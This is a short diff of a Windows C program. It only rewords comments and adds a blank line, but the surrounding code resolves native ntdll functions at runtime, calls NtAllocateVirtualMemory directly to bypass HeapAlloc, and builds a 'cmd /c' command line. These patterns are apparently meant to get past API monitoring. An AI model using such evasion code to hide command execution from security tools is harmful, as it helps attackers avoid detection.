@@ -4,7 +4,7 @@
 
 int main(int argc, char** argv){
   
-  //lets get ntdll / kernel32 and functions we need from it
+  //get ntdll / kernel32 and functions we need from it
   HANDLE hProcess = NULL;
   HMODULE hNtdll = NULL;
   HMODULE hKernel32 = NULL;
@@ -25,6 +25,7 @@ int main(int argc, char** argv){
   FARPROC fpRtlInitUnicodeString = GetProcAddress(hNtdll, "RtlInitUnicodeString");
   FARPROC fpNtOpenFile = GetProcAddress(hNtdll, "NtOpenFile");
   FARPROC fpLdrUnloadDll = GetProcAddress(hNtdll, "LdrUnloadDll");
+
   //cast functions to get our Nt function pointers
   ntAllocateVirtualMemory NtAllocateVirtualMemory = (ntAllocateVirtualMemory)fpNtAllocateVirtualMemory;
   ntFreeVirtualMemory NtFreeVirtualMemory = (ntFreeVirtualMemory)fpNtFreeVirtualMemory;
@@ -52,7 +53,7 @@ int main(int argc, char** argv){
     dwArgsLen += strlen(argv[i]);
   }
 
-  //let's remove our use of malloc by using HeapCreate, HeapAlloc, HeapFree, HeapDestroy
+  //remove our use of malloc by using HeapCreate, HeapAlloc, HeapFree, HeapDestroy
   //finally let's bypass HeapAlloc with a direct call to NtAllocateVirtualMemory
   NTSTATUS ntStatus;
   SIZE_T stCommandLine = (sizeof(BYTE) * (strlen("cmd /c "))) + (sizeof(BYTE) * (dwArgsLen + 1));
